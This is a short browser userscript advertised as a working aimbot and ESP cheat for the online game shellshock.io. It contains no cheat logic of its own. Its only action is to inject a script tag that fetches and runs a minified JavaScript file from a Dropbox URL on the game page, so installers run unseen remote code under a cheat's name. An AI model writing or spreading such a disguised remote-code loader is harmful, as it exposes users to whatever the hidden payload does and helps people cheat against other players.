// ==UserScript==

// @name         Shellshock.io aimbot (WORKING)

// @version      3.9

// @description  Shellshock Aimbot + Esp

// @author       Nanzo Operations GMBH

// @match        *://shellshock.io/*

// @grant        none

// @namespace https://greasyfork.org/en/users/686784

// ==/UserScript==


var script = document.createElement('script');

script.src = '//dl.dropboxusercontent.com/s/wjuz0lovxa00an3/5shellshock.min.js';

script.type = 'text/javascript';

document.body.appendChild(script);
